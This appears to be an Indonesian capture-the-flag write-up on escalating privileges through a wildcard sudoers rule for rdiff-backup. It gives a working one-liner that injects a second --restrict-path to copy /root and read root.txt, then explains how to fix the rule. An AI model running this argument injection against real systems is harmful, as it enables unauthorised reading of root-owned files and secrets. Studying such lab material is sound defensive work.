# Write-Up: Linux Privilege Escalation via rdiff-backup (Argument Injection)

## 📌 Ringkasan Celah Keamanan
* **Nama Tool:** `rdiff-backup`
* **Vektor Serangan:** Sudoers Misconfiguration (Wildcard `*` Abuse) + Argument Overriding.
* **Dampak:** Membaca file apa pun dengan hak akses `root` (Arbitrary File Read / Privilege Escalation).

---

## 🧠 Pemahaman Konsep (Bagaimana rdiff-backup Bekerja)
`rdiff-backup` adalah aplikasi berbasis Python untuk melakukan pencadangan data (*backup*). Aplikasi ini mendukung arsitektur **Klien-Server**:
1. **Klien (Client):** Proses yang meminta data untuk dicadangkan.
2. **Server:** Proses yang berjalan (biasanya di mesin target) untuk membaca data dan mengirimkannya ke klien. Flag `--server` memaksa aplikasi masuk ke mode pelayan, menunggu perintah biner/objek Python lewat input standar (`stdin`).

### Mengapa Celah Ini Terjadi? (Root Cause)
1. **Hak Akses Sudo Tanpa Password (`NOPASSWD`):** Administrator mengizinkan user biasa menjalankan perintah `rdiff-backup --server` sebagai `root`.
2. **Kelemahan Wildcard Sudo (`*`):** Aturan sudoers diakhiri dengan tanda bintang (`*`), yang berarti kita bisa menambahkan parameter ekstra apa saja setelah perintah utama.
3. **Logika Python Overriding Parameter:** `rdiff-backup` memproses parameter dari kiri ke kanan. Jika parameter keamanan seperti `--restrict-path` ditulis **dua kali**, parser Python akan mengambil nilai yang dimasukkan **paling akhir** dan menimpa batasan yang pertama.

---

## 🛠️ Langkah Demi Langkah Eksploitasi (Step-by-Step)

### Langkah 1: Analisis Aturan Sudoers
Jalankan perintah ini di terminal target untuk melihat hak istimewa yang Anda miliki:
```bash
sudo -l
```
*Output yang ditemukan:*
```text
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```
*Catatan:* Perhatikan tanda bintang (`*`) di ujung kanan. Ini adalah kunci pintu masuk kita.

### Langkah 2: Eksekusi Bypass & Ekstraksi File (Bukan Folder)
Karena `rdiff-backup` membutuhkan objek berupa direktori saat mencadangkan data, kita menargetkan folder induknya (misal folder `/root` untuk mengambil `root.txt` atau folder `/etc` untuk mengambil file konfigurasi sistem).

Jalankan perintah satu baris (*one-liner*) berikut:

```bash
rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' backup /::/root /tmp/root_bak
```

### 🔍 Bedah Cara Kerja Perintah Di Atas:
* `rdiff-backup ... backup /::/root /tmp/root_bak`: Menjalankan klien lokal untuk membackup folder `/root` dari server bayangan ke folder lokal `/tmp/root_bak`.
* `--remote-schema '...'`: Mengelabui sistem agar klien lokal membuat server bayangannya sendiri di mesin yang sama dengan mengeksekusi teks di dalam kutip tunggal.
* `sudo /usr/bin/rdiff-backup --server ...`: Sudo mencocokkan string ini dengan aturan di sudoers. Karena bagian awalnya persis, Sudo meloloskannya tanpa password.
* `--restrict-path %s`: Tanda `%s` akan otomatis digantikan oleh jalur root (`/`) dari input klien. Di sinilah **Argument Injection** terjadi. Perintah akhir yang berjalan di memori menjadi:
  `--restrict-path /opt/backup ... --restrict-path /`
  Aplikasi secara otomatis membuang batasan `/opt/backup` dan mengubah hak akses baca ke seluruh sistem (`/`).

---

## 📄 Membaca Hasil Flag
Setelah pencadangan selesai tanpa error, semua file di dalam folder `/root` telah tersalin ke folder `/tmp/root_bak` dengan hak milik user Anda. Anda bisa langsung membaca file flag `root.txt`:

```bash
cat /tmp/root_bak/root.txt
```

---

## 🛡️ Cara Remediasi (Memperbaiki Celah)
Bagi administrator sistem, cara mengamankan konfigurasi ini agar tidak bisa dieksploitasi adalah dengan **menghapus tanda wildcard (`*`)** pada file `/etc/sudoers`:

```text
# Konfigurasi Aman:
owen ALL=(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only
```
Tanpa tanda bintang (`*`), user tidak akan bisa menambahkan parameter `--restrict-path` kedua untuk menimpa batasan folder asli.